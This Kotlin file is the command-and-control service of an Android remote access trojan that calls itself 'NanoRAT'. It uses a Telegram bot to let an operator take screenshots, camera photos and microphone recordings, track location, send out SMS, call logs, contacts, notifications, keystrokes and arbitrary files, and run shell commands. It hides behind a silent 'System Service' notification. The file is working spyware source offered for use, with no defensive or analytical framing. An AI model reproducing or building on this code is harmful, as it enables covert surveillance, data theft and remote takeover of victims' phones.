package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class TelegramC2Service : Service() {

    companion object {
        private const val TAG = "TgC2"
        private const val NOTIF_ID = 2
        private const val CHANNEL_ID = "c2tg"
        private const val API_BASE = "https://api.telegram.org/bot"
    }

    private val BOT_TOKEN: String = BuildConfig.TG_BOT_TOKEN
    private val CHAT_ID: String = BuildConfig.TG_CHAT_ID

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }

    @Volatile private var projection: MediaProjection? = null
    @Volatile private var captureSession: ScreenCaptureSession? = null
    @Volatile private var lastUpdateId: Long = 0

    // UI state
    @Volatile private var currentMenuPath: MutableList<String> = mutableListOf("main")
    @Volatile private var currentMenuMessageId: Long = 0L
    @Volatile private var startedAt: Long = System.currentTimeMillis()
    @Volatile private var commandCount: Int = 0

    private fun log(msg: String) {
        android.util.Log.i(TAG, msg)
        LogBus.append(applicationContext, "TG", msg)
    }

    override fun onCreate() {
        super.onCreate()
        log("onCreate deviceId=$deviceId")
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)

        if (BOT_TOKEN.isEmpty() || BOT_TOKEN.startsWith("TG_TOKEN")) {
            log("BOT_TOKEN not configured")
            return
        }
        if (CHAT_ID.isEmpty() || CHAT_ID.startsWith("TG_CHAT")) {
            log("CHAT_ID not configured")
            return
        }

        startedAt = System.currentTimeMillis()

        scope.launch {
            registerBotCommands()
            delay(500)
            sendMainMenu()
        }
        scope.launch { pollLoop() }
        scope.launch { autoRefreshLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand action=${intent?.action}")
        if (intent?.action == "START_PROJECTION") {
            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                intent.getParcelableExtra("proj_data", Intent::class.java)
            else
                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
            if (code != Int.MIN_VALUE && data != null) {
                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                initProjectionFromIntent(code, data)
            }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
        log("initProjection: code=$resultCode")
        try {
            captureSession?.release()
            captureSession = null
            try { projection?.stop() } catch (_: Exception) {}
            projection = null

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(resultCode, data)
            log("getMediaProjection: $proj")
            if (proj == null) return

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    log("projection onStop")
                    captureSession?.release()
                    captureSession = null
                    projection = null
                    scope.launch { refreshCurrentMenu() }
                }
            }, Handler(Looper.getMainLooper()))

            projection = proj
            captureSession = ScreenCaptureSession(this, proj)
            log("projection ACTIVE with capture session")
            scope.launch { refreshCurrentMenu() }
        } catch (e: Exception) {
            log("initProjection ERROR: ${e.message}")
            projection = null
            captureSession = null
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "TG", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // ---------- Telegram API ----------

    private suspend fun apiCall(method: String, body: RequestBody): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url("$API_BASE$BOT_TOKEN/$method")
                .post(body)
                .build()
            try {
                val raw = client.newCall(req).execute().use { r -> r.body?.string() }
                if (raw == null) return@withContext null
                if (!raw.trimStart().startsWith("{")) return@withContext null
                JSONObject(raw)
            } catch (e: Exception) {
                log("api $method: ${e.message}")
                null
            }
        }

    private suspend fun sendChatAction(action: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("action", action)
            .build()
        apiCall("sendChatAction", body)
    }

    private suspend fun sendMessage(text: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("disable_web_page_preview", "true")
            .build()
        apiCall("sendMessage", body)
    }

    private suspend fun sendMessageWithKeyboard(text: String, keyboard: JSONObject): Long {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("disable_web_page_preview", "true")
            .addFormDataPart("reply_markup", keyboard.toString())
            .build()
        val resp = apiCall("sendMessage", body)
        return resp?.optJSONObject("result")?.optLong("message_id") ?: 0L
    }

    private suspend fun editMessageWithKeyboard(
        messageId: Long, text: String, keyboard: JSONObject
    ) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("message_id", messageId.toString())
            .addFormDataPart("text", text.take(4000))
            .addFormDataPart("parse_mode", "HTML")
            .addFormDataPart("disable_web_page_preview", "true")
            .addFormDataPart("reply_markup", keyboard.toString())
            .build()
        apiCall("editMessageText", body)
    }

    private suspend fun answerCallback(callbackId: String, text: String = "") {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("callback_query_id", callbackId)
            .addFormDataPart("text", text)
            .build()
        apiCall("answerCallbackQuery", body)
    }

    private suspend fun sendDocument(filename: String, mime: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody(mime.toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("document", filename, fileBody)
            .build()
        apiCall("sendDocument", body)
    }

    private suspend fun sendPhoto(filename: String, jpegBytes: ByteArray, caption: String = "") {
        val fileBody = jpegBytes.toRequestBody("image/jpeg".toMediaType())
        val builder = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", filename, fileBody)
        if (caption.isNotEmpty()) builder.addFormDataPart("caption", caption.take(1000))
        apiCall("sendPhoto", builder.build())
    }

    private suspend fun sendAudio(filename: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody("audio/mp4".toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("audio", filename, fileBody)
            .build()
        apiCall("sendAudio", body)
    }

    private suspend fun registerBotCommands() {
        val cmds = JSONArray().apply {
            put(JSONObject().put("command", "start").put("description", "🏠 Main menu"))
            put(JSONObject().put("command", "menu").put("description", "📋 Show menu"))
            put(JSONObject().put("command", "status").put("description", "📊 Live status"))
            put(JSONObject().put("command", "info").put("description", "📱 Device info"))
            put(JSONObject().put("command", "shell").put("description", "💻 Run shell command"))
            put(JSONObject().put("command", "screenshot").put("description", "📸 Screen capture"))
        }
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("commands", cmds.toString())
            .build()
        apiCall("setMyCommands", body)
    }

    // ---------- Live status ----------

    private fun batteryPct(): Int {
        return try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) { 0 }
    }

    private fun batteryIcon(pct: Int): String = when {
        pct >= 80 -> "🔋"
        pct >= 40 -> "🔋"
        pct >= 15 -> "🪫"
        else      -> "🪫"
    }

    private fun uptimeStr(): String {
        val s = (System.currentTimeMillis() - startedAt) / 1000
        val h = s / 3600
        val m = (s % 3600) / 60
        return if (h > 0) "${h}h ${m}m" else "${m}m"
    }

    private fun notifCount(): Int {
        return try { NotificationsBuffer.peek().length() } catch (_: Exception) { 0 }
    }

    private fun mainStatusLine(): String {
        val bat = batteryPct()
        val proj = if (captureSession != null) "🟢" else "🟡"
        val notif = notifCount()
        return "$proj capture   ${batteryIcon(bat)} $bat%   🔔 $notif   ⏱ ${uptimeStr()}"
    }

    private fun mainMenuText(): String {
        val name = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        return buildString {
            append("<b>🤖 NanoRAT — Control Center</b>\n")
            append("━━━━━━━━━━━━━━━━━━━━━━\n")
            append("📱 <code>$name</code>\n")
            append("🆔 <code>${deviceId.take(8)}…</code>\n")
            append("${mainStatusLine()}\n")
            append("━━━━━━━━━━━━━━━━━━━━━━")
        }
    }

    // ---------- Menus ----------

    private fun mainKeyboard(): JSONObject {
        val projReady = captureSession != null
        val screenshotLabel = if (projReady) "📸 Screenshot" else "🚫 Screenshot"

        return JSONObject().put("inline_keyboard", JSONArray().apply {
            // Row 1 — quick actions
            put(JSONArray().apply {
                put(JSONObject().put("text", screenshotLabel)
                    .put("callback_data", if (projReady) "act:screenshot" else "act:no_projection"))
                put(JSONObject().put("text", "📊 Status").put("callback_data", "menu:status"))
            })
            // Row 2 — main categories
            put(JSONArray().apply {
                put(JSONObject().put("text", "📸 Capture").put("callback_data", "menu:capture"))
                put(JSONObject().put("text", "🎙 Record").put("callback_data", "menu:record"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📁 Files").put("callback_data", "menu:files"))
                put(JSONObject().put("text", "📊 Info").put("callback_data", "menu:info"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎮 Control").put("callback_data", "menu:control"))
                put(JSONObject().put("text", "💬 Comms").put("callback_data", "menu:comms"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔐 Privacy").put("callback_data", "menu:privacy"))
                put(JSONObject().put("text", "⚙️ System").put("callback_data", "menu:system"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "act:refresh"))
                put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
            })
        })
    }

    private fun backRow(): JSONArray = JSONArray().apply {
        put(JSONObject().put("text", "⬅️ Back").put("callback_data", "menu:back"))
        put(JSONObject().put("text", "🏠 Main").put("callback_data", "menu:main"))
        put(JSONObject().put("text", "❌ Close").put("callback_data", "menu:close"))
    }

    private fun captureMenuText(): String = buildString {
        append("<b>📸 Capture</b>\n")
        append("━━━━━━━━━━━━━━━━━━━━━━\n")
        if (captureSession != null) {
            append("🟢 Capture ready\n")
            append("Screen projection is active.")
        } else {
            append("🔴 Capture disabled\n")
            append("Open the app and grant screen capture permission.")
        }
    }

    private fun captureMenuKeyboard(): JSONObject {
        val ready = captureSession != null
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", if (ready) "📸 Screenshot" else "🚫 Screenshot")
                    .put("callback_data", if (ready) "act:screenshot" else "act:no_projection"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🤳 Front camera").put("callback_data", "act:camera:front"))
                put(JSONObject().put("text", "📷 Back camera").put("callback_data", "act:camera:back"))
            })
            put(backRow())
        })
    }

    private fun recordMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎙 5s").put("callback_data", "act:mic:5"))
                put(JSONObject().put("text", "🎙 10s").put("callback_data", "act:mic:10"))
                put(JSONObject().put("text", "🎙 30s").put("callback_data", "act:mic:30"))
            })
            put(backRow())
        })

    private fun filesMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📂 /sdcard").put("callback_data", "act:ls:/sdcard"))
                put(JSONObject().put("text", "📂 Download").put("callback_data", "act:ls:/sdcard/Download"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📂 DCIM").put("callback_data", "act:ls:/sdcard/DCIM"))
                put(JSONObject().put("text", "📂 Pictures").put("callback_data", "act:ls:/sdcard/Pictures"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📥 Download file").put("callback_data", "prompt:get"))
            })
            put(backRow())
        })

    private fun infoMenuKeyboard(): JSONObject {
        val notif = notifCount()
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📱 Device").put("callback_data", "act:info"))
                put(JSONObject().put("text", "🌐 Network").put("callback_data", "act:network"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📍 Location").put("callback_data", "act:location"))
                put(JSONObject().put("text", "📦 Apps").put("callback_data", "act:apps"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔔 Notifications ($notif)").put("callback_data", "act:notif"))
            })
            put(backRow())
        })
    }

    private fun controlMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔒 Lock").put("callback_data", "act:lock"))
                put(JSONObject().put("text", "🏠 Home").put("callback_data", "act:home"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "◀️ Back key").put("callback_data", "act:back"))
                put(JSONObject().put("text", "🪟 Recents").put("callback_data", "act:recents"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "💻 Shell").put("callback_data", "prompt:shell"))
                put(JSONObject().put("text", "🔗 Open URL").put("callback_data", "prompt:url"))
            })
            put(backRow())
        })

    private fun commsMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📞 Call log").put("callback_data", "act:calls"))
                put(JSONObject().put("text", "💬 SMS").put("callback_data", "act:sms"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "👥 Contacts").put("callback_data", "act:contacts"))
                put(JSONObject().put("text", "🔔 Notifications").put("callback_data", "act:notif"))
            })
            put(backRow())
        })

    private fun privacyMenuKeyboard(): JSONObject {
        val kl = try { KeylogBuffer.isActive() } catch (_: Exception) { false }
        val klState = if (kl) "🟢 recording" else "🔴 stopped"
        return JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "⌨️ $klState")
                    .put("callback_data", "act:keylog_info"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "▶️ Start").put("callback_data", "act:keylog_start"))
                put(JSONObject().put("text", "⏹ Stop").put("callback_data", "act:keylog_stop"))
                put(JSONObject().put("text", "📤 Dump").put("callback_data", "act:keylog_dump"))
            })
            put(backRow())
        })
    }

    private fun systemMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Refresh menu").put("callback_data", "act:refresh"))
                put(JSONObject().put("text", "📊 Live status").put("callback_data", "menu:status"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🗑 Self destruct").put("callback_data", "prompt:selfdestruct"))
            })
            put(backRow())
        })

    private fun statusMenuText(): String {
        val bat = batteryPct()
        val proj = if (captureSession != null) "🟢 active" else "🟡 disabled"
        val kl = try { if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped" } catch (_: Exception) { "?" }
        val notif = notifCount()
        val now = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        return buildString {
            append("<b>📊 Live Status</b>\n")
            append("━━━━━━━━━━━━━━━━━━━━━━\n")
            append("🕐 <code>$now</code>\n")
            append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
            append("📸 Projection: $proj\n")
            append("⌨️ Keylogger: $kl\n")
            append("🔔 Notifications: $notif\n")
            append("⏱ Uptime: ${uptimeStr()}\n")
            append("⚡ Commands: $commandCount\n")
            append("━━━━━━━━━━━━━━━━━━━━━━")
        }
    }

    private fun statusMenuKeyboard(): JSONObject =
        JSONObject().put("inline_keyboard", JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 Refresh").put("callback_data", "menu:status"))
                put(JSONObject().put("text", "📊 Network").put("callback_data", "act:network"))
            })
            put(backRow())
        })

    private suspend fun sendMainMenu() {
        currentMenuPath = mutableListOf("main")
        val id = sendMessageWithKeyboard(mainMenuText(), mainKeyboard())
        if (id > 0) currentMenuMessageId = id
    }

    private suspend fun renderMenu(path: String, messageId: Long, edit: Boolean) {
        val (text, kb) = when (path) {
            "main"    -> mainMenuText() to mainKeyboard()
            "capture" -> captureMenuText() to captureMenuKeyboard()
            "record"  -> "<b>🎙 Record audio</b>\nSelect a duration:" to recordMenuKeyboard()
            "files"   -> "<b>📁 Files</b>\nBrowse the device filesystem:" to filesMenuKeyboard()
            "info"    -> "<b>📊 Info</b>\nDevice intelligence:" to infoMenuKeyboard()
            "control" -> "<b>🎮 Control</b>\nDevice actions:" to controlMenuKeyboard()
            "comms"   -> "<b>💬 Comms</b>\nCalls, SMS, contacts:" to commsMenuKeyboard()
            "privacy" -> "<b>🔐 Privacy</b>\nKeylogger and notifications:" to privacyMenuKeyboard()
            "system"  -> "<b>⚙️ System</b>\nMaintenance:" to systemMenuKeyboard()
            "status"  -> statusMenuText() to statusMenuKeyboard()
            else      -> mainMenuText() to mainKeyboard()
        }
        if (edit && messageId > 0) {
            editMessageWithKeyboard(messageId, text, kb)
        } else {
            val id = sendMessageWithKeyboard(text, kb)
            if (id > 0) currentMenuMessageId = id
        }
    }

    private suspend fun refreshCurrentMenu() {
        val path = currentMenuPath.lastOrNull() ?: "main"
        if (currentMenuMessageId > 0) {
            renderMenu(path, currentMenuMessageId, edit = true)
        }
    }

    private suspend fun autoRefreshLoop() {
        while (currentCoroutineContext().isActive) {
            delay(60_000)
            try {
                val path = currentMenuPath.lastOrNull() ?: "main"
                if (path == "main" || path == "status") {
                    refreshCurrentMenu()
                }
            } catch (_: Exception) {}
        }
    }

    // ---------- Long poll ----------

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("offset", (lastUpdateId + 1).toString())
                    .addFormDataPart("timeout", "30")
                    .addFormDataPart("allowed_updates", "[\"message\",\"callback_query\"]")
                    .build()

                val resp = apiCall("getUpdates", body)
                if (resp == null) { delay(3000); continue }
                if (!resp.optBoolean("ok", false)) { delay(5000); continue }

                val results = resp.optJSONArray("result") ?: JSONArray()
                for (i in 0 until results.length()) {
                    val upd = results.getJSONObject(i)
                    val updateId = upd.optLong("update_id")
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(upd)
                }
            } catch (e: Exception) {
                log("poll error: ${e.message}")
            }
            delay(1000)
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        update.optJSONObject("message")?.let { msg ->
            val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return@let
            if (chatId != CHAT_ID) return@let
            val text = msg.optString("text", "").trim()
            if (text.isEmpty()) return@let
            log("cmd: $text")
            commandCount++
            try { dispatchTextCommand(text) } catch (e: Exception) {
                log("dispatch error: ${e.message}")
                sendMessage("⚠️ error: ${e.message}")
            }
        }

        update.optJSONObject("callback_query")?.let { cb ->
            val fromId = cb.optJSONObject("from")?.optLong("id")?.toString() ?: return@let
            if (fromId != CHAT_ID) return@let
            val cbId = cb.optString("id", "")
            val data = cb.optString("data", "")
            val msgId = cb.optJSONObject("message")?.optLong("message_id") ?: 0L
            log("callback: $data")
            commandCount++
            try { handleCallback(cbId, msgId, data) } catch (e: Exception) {
                log("handleCallback error: ${e.message}")
                answerCallback(cbId, "error")
            }
        }
    }

    private suspend fun handleCallback(callbackId: String, messageId: Long, data: String) {
        val parts = data.split(":", limit = 3)
        val kind = parts.getOrNull(0) ?: return

        when (kind) {
            "menu" -> {
                val which = parts.getOrNull(1) ?: "main"
                answerCallback(callbackId)
                when (which) {
                    "close" -> {
                        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", CHAT_ID)
                            .addFormDataPart("message_id", messageId.toString())
                            .build()
                        apiCall("deleteMessage", body)
                        return
                    }
                    "back" -> {
                        // pop the last path
                        if (currentMenuPath.size > 1) currentMenuPath.removeAt(currentMenuPath.size - 1)
                        val prev = currentMenuPath.lastOrNull() ?: "main"
                        currentMenuMessageId = messageId
                        renderMenu(prev, messageId, edit = true)
                        return
                    }
                    "main" -> {
                        currentMenuPath = mutableListOf("main")
                        currentMenuMessageId = messageId
                        renderMenu("main", messageId, edit = true)
                        return
                    }
                    else -> {
                        // push the new path (replace last if same)
                        val last = currentMenuPath.lastOrNull()
                        if (last != which) currentMenuPath.add(which)
                        currentMenuMessageId = messageId
                        renderMenu(which, messageId, edit = true)
                        return
                    }
                }
            }

            "act" -> {
                val action = parts.getOrNull(1) ?: return
                val sub = parts.getOrNull(2) ?: ""
                answerCallback(callbackId, "⏳ working…")
                scope.launch { sendChatAction("upload_photo") }
                runAction(action, sub)
            }

            "prompt" -> {
                val what = parts.getOrNull(1) ?: return
                answerCallback(callbackId, "send /$what <value>")
                sendMessage("Type: <code>/$what your_input</code>")
            }
        }
    }

    private suspend fun runAction(action: String, sub: String) {
        log("runAction[$action]")
        when (action) {
            "no_projection" -> {
                sendMessage("🚫 Screen capture not active.\n\nOpen the app → tap <b>4. Enable screen capture permission</b> → accept.")
            }

            "screenshot" -> {
                val session = captureSession
                if (session == null) { sendMessage("🚫 no projection session"); return }
                val res = session.capture()
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("⚠️ capture failed: ${res.optString("error")}"); return }
                sendPhoto("screen_${System.currentTimeMillis()}.jpg",
                          Base64.decode(b64, Base64.NO_WRAP),
                          "📸 <i>${SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())}</i>")
            }

            "camera" -> {
                val cam = sub.ifEmpty { "back" }
                sendMessage("📷 taking $cam photo…")
                val res = Camera.capture(this, cam)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("⚠️ camera error: ${res.optString("error")}"); return }
                sendPhoto("cam_${System.currentTimeMillis()}.jpg",
                          Base64.decode(b64, Base64.NO_WRAP),
                          "📷 $cam camera")
            }

            "mic" -> {
                val sec = sub.toIntOrNull()?.coerceIn(1, 60) ?: 10
                sendMessage("🎙 recording ${sec}s…")
                sendChatAction("record_voice")
                val res = Audio.record(this, sec)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("⚠️ mic error: ${res.optString("error")}"); return }
                sendAudio("mic_${System.currentTimeMillis()}.m4a", Base64.decode(b64, Base64.NO_WRAP))
            }

            "info" -> {
                val s = DeviceInfo.snapshot(this, deviceId)
                val bat = batteryPct()
                val pretty = buildString {
                    append("<b>📱 Device Info</b>\n")
                    append("━━━━━━━━━━━━━━━━━━━━━━\n")
                    append("🏷 Model: <b>${s.optString("model")}</b>\n")
                    append("🏭 Maker: ${s.optString("manufacturer")}\n")
                    append("🤖 Android: ${s.optString("android_version")} (SDK ${s.optInt("sdk_int")})\n")
                    append("💻 Host: <code>${s.optString("hostname")}</code>\n")
                    append("${batteryIcon(bat)} Battery: <b>$bat%</b>\n")
                    append("🆔 ID: <code>${s.optString("device_id")}</code>")
                }
                sendMessage(pretty)
            }

            "network" -> {
                val n = NetworkInfo.snapshot(this)
                sendMessage("<pre>${n.toString(2).take(3500)}</pre>")
            }

            "location" -> {
                sendChatAction("find_location")
                val loc = Location.get(this)
                if (loc.has("error")) {
                    sendMessage("📍 ${loc.optString("error")}")
                } else {
                    val lat = loc.optDouble("lat")
                    val lng = loc.optDouble("lng")
                    sendMessage(buildString {
                        append("<b>📍 Location</b>\n")
                        append("━━━━━━━━━━━━━━━━━━━━━━\n")
                        append("Lat: <code>$lat</code>\n")
                        append("Lng: <code>$lng</code>\n")
                        append("Accuracy: ${loc.optDouble("accuracy")}m\n")
                        append("Provider: ${loc.optString("provider")}")
                    })
                    val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("latitude", lat.toString())
                        .addFormDataPart("longitude", lng.toString())
                        .build()
                    apiCall("sendLocation", body)
                }
            }

            "apps" -> sendDocument("apps.json", "application/json",
                                    Apps.list(this, false).toString().toByteArray())
            "calls" -> sendDocument("calls.json", "application/json",
                                     CallLog.list(this, 50).toString().toByteArray())
            "sms" -> sendDocument("sms.json", "application/json",
                                   Sms.list(this, 50).toString().toByteArray())
            "contacts" -> sendDocument("contacts.json", "application/json",
                                        Contacts.list(this).toString().toByteArray())
            "notif" -> {
                val res = JSONObject()
                    .put("count", NotificationsBuffer.peek().length())
                    .put("items", NotificationsBuffer.drain())
                sendDocument("notifications.json", "application/json", res.toString().toByteArray())
                refreshCurrentMenu()
            }
            "lock" -> sendMessage("🔒 ${SystemControl.lockScreen(this)}")
            "home" -> sendMessage("🏠 ${SystemControl.goHome()}")
            "back" -> sendMessage("◀️ ${SystemControl.back()}")
            "recents" -> sendMessage("🪟 ${SystemControl.recents()}")

            "keylog_start" -> {
                KeylogBuffer.start()
                sendMessage("⌨️ keylogger <b>started</b>")
                refreshCurrentMenu()
            }
            "keylog_stop" -> {
                KeylogBuffer.stop()
                sendMessage("⌨️ keylogger <b>stopped</b>")
                refreshCurrentMenu()
            }
            "keylog_dump" -> {
                val res = KeylogBuffer.dump()
                val text = res.optString("output", "").ifEmpty { "(empty)" }
                val lines = text.lines().takeLast(50).joinToString("\n")
                sendMessage("<b>⌨️ Keylog dump</b>\n<pre>${lines.take(3500)}</pre>")
                refreshCurrentMenu()
            }
            "keylog_info" -> sendMessage("keylog state: " +
                (if (KeylogBuffer.isActive()) "🟢 recording" else "🔴 stopped"))

            "ls" -> {
                val res = Files.listDir(sub.ifEmpty { "/sdcard" })
                sendMessage("<b>📂 <code>$sub</code></b>\n<pre>${res.toString(2).take(3500)}</pre>")
            }
            "refresh" -> {
                sendMessage("🔄 refreshing…")
                delay(300)
                refreshCurrentMenu()
                sendMainMenu()
            }
            else -> sendMessage("unknown action: $action")
        }
    }

    private suspend fun dispatchTextCommand(text: String) {
        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = parts.getOrNull(1) ?: ""

        when (cmd) {
            "start", "menu", "help" -> sendMainMenu()
            "status" -> {
                val id = sendMessageWithKeyboard(statusMenuText(), statusMenuKeyboard())
                if (id > 0) {
                    currentMenuMessageId = id
                    currentMenuPath = mutableListOf("status")
                }
            }
            "shell" -> {
                if (arg.isEmpty()) { sendMessage("usage: <code>/shell ls -la</code>"); return }
                sendChatAction("typing")
                val res = Shell.exec(arg)
                val out = res.optString("stdout", "") + res.optString("stderr", "")
                sendMessage("<b>💻 shell</b> <code>[exit ${res.optInt("exit", -1)}]</code>\n<pre>${out.take(3500)}</pre>")
            }
            "screenshot" -> runAction("screenshot", "")
            "camera" -> runAction("camera", arg.ifEmpty { "back" })
            "mic" -> runAction("mic", arg.ifEmpty { "10" })
            "location" -> runAction("location", "")
            "contacts" -> runAction("contacts", "")
            "sms" -> runAction("sms", arg)
            "calls" -> runAction("calls", arg)
            "apps" -> runAction("apps", "")
            "network" -> runAction("network", "")
            "notif" -> runAction("notif", "")
            "lock" -> runAction("lock", "")
            "home" -> runAction("home", "")
            "back" -> runAction("back", "")
            "recents" -> runAction("recents", "")
            "keylog_start" -> runAction("keylog_start", "")
            "keylog_stop" -> runAction("keylog_stop", "")
            "keylog_dump" -> runAction("keylog_dump", "")
            "get" -> {
                if (arg.isEmpty()) { sendMessage("usage: <code>/get /path/to/file</code>"); return }
                sendChatAction("upload_document")
                val res = Files.exfil(this, arg)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) { sendMessage("⚠️ ${res.optString("error")}"); return }
                val name = arg.substringAfterLast('/').ifEmpty { "file.bin" }
                sendDocument(name, "application/octet-stream", Base64.decode(b64, Base64.NO_WRAP))
            }
            "open" -> sendMessage(SystemControl.openApp(this, arg).toString())
            "url" -> sendMessage(SystemControl.openUrl(this, arg).toString())
            "info" -> runAction("info", "")
            else -> sendMessage("❓ unknown: /$cmd — try /start")
        }
    }

    override fun onDestroy() {
        log("onDestroy")
        captureSession?.release()
        captureSession = null
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()
        super.onDestroy()
    }
}
